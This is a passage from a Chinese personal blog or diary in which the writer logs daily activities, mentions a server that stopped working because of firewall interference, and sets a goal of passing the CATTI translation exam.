11:30装宽带的师傅来安装光猫，调试。\n- 12:50跟氕氕约着一起去按摩肩颈疏通下经络，然后又刮了个痧，现在整个背又痛又不能看。但是真的舒服。\n- 15:30去公司赶项目报告。\n- 18:30一个人在公司楼下吃了个晚饭。食堂比外卖好吃多了。\n- 19:00坐公交车遇到一个凶凶的司机。\n- 20:30男票带我一起研究了一下我俩突然无法翻墙的服务器，如下图所示。原因是GFW把我们服务器发回的ACK响应包给截了。哈哈哈有用的知识又增加了！\n\n![](evil-gfw.png)\n\n# 20200919\n\n突发奇想，想要捡起从初中开始就很喜欢但从高中毕业就没好好学过的英语。曲曲折折绕了一圈又一圈，最终还是会回到心中的原点。一个人一辈子只做一件事，并且能一直做好，也是一件很了不起的事情啊。\n\n给自己定个小目标吧，明年把CATTI二级考过，扎实一下翻译功底。加油加油！\n\n\n\n# 20201117\n\n时间过得可真快。一天天都干了啥呢。","categories":["Life"]}]